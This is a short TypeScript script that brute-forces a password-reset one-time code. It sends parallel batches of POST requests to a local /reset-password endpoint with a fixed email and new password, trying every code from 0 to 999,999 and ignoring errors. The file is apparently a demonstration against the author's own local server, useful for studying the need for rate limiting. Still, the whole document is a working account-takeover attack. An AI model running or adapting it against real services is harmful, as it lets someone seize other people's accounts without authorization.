import axios from "axios";


async function sendRequest(otp:string) {

    let data = JSON.stringify({
    "email": "rishabh@gmail.com",
    "otp": otp,
    "newPassword": "333333"
    });

    let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: { 
        'Content-Type': 'application/json'
    },
    data : data
    };

    // axios.request(config)
    // .then((response) => {
    // console.log(JSON.stringify(response.data));
    // })
    // .catch((error) => {
    // console.log(error);
    // });
    try {
        await axios.request(config)
    } catch (error) {
        // console.log(error)
    }
}

// sendRequest("572188")

// for(let i = 0; i<=9999999; i++){
//     console.log(i)
//     sendRequest(i.toString())
// }

async function main() {
  for (let i = 0; i < 1000000; i+=100) {
    const promises = [];
    console.log("here for " + i);
    for (let j = 0; j < 100; j++) {
      promises.push(sendRequest((i + j).toString()))
    }
    await Promise.all(promises);
  }
}

main()